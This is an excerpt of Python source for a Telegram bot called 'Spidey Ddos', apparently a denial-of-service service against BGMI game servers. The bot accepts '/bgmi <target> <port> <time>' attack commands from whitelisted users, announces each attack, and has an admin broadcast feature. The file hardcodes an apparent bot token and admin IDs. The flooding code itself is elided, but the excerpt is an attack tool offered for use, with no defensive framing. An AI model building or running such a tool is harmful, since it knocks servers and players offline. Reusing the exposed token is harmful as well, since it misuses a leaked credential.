...
bot = telebot.TeleBot('6882209971:AAF4N7T9hwcCsibvUNitJeKsbwtACeAU9WU')

# Admin user IDs
admin_id = ["", "1445624289", "", "User ID"]
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"☣️ATTACK BY : {username}\n\n🏆Target : {target}\n🍄Port : {port}\n🪺Time : {time} Seconds"
    bot.reply_to(message, response)
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 1000:
                response = "Error: Time interval must be less than 1080."
            else:
                ...
                response = f"Attack Finished\nNow you kiil offline players"
        else:
            response = "🤧 Usage :- /bgmi <target> <port> <time>\nWait 10 second then send again"  # Updated command syntax
    else:
...
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''wlecome to Spidey Ddos use /bgmi to attack server'''
    bot.reply_to(message, response)
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 1:
            message_to_broadcast = "Message form Admin : @SPIDEYXX33\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
